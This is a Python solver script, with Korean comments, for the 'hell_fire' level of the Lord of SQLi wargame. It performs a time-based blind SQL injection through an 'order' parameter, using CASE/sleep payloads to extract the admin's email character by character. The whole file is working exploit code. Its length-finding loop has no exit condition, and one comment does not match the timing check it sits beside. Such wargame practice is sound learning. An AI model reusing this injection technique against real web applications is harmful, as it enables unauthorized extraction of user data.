#LOS hell_fire

import math
import time
import requests

url ="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?" #공격URL
cookies ={"PHPSESSID": ""} #쿠키값

#패스워드 길이 찾기
def pw_len():
    len_num = 0

    while 1 :
        len_num = len_num + 1
        
        start = time.time()
        math.factorial(100000)

        value = "(case when (id='admin' and length(email)={}) then sleep(10) else sleep(1) end)".format(len_num) #injection payload
        parmas = {'order': value}      #url에 GET으로 전달하는 파라미터

        
        response = requests.get(url,params=parmas, cookies=cookies)
        end = time.time()
        print(value + f"{end-start:.5f} sec")

    return len_num

def pw_real(len_num):
    pw=''
    for i in range(1,len_num+1):
        print(i,"번째 검색 중")

       
        for j in range(46, 122):  #아스키코드값 48번부터 122번
 
            start = time.time()
            math.factorial(100000)
            value = "(case when (id='admin' and ascii(substr(email,{},1))={}) then sleep(5) else sleep(1) end)".format(i,j) #injection payload
            parmas = {'order':value}
            response = requests.get(url, params=parmas, cookies=cookies)
            end = time.time()
            take_time = end - start
            

            print(value + "    time : " + str(take_time))
            #print("email: ", j)

            if take_time >6 and take_time<10:      #응답값에 Hello admin이 있으면 반환
                pw = pw + chr(j)    #chr(): 아스키코드값 -> 문자
                print("password  : ", pw)
                break
    return pw

pw_real(pw_len())
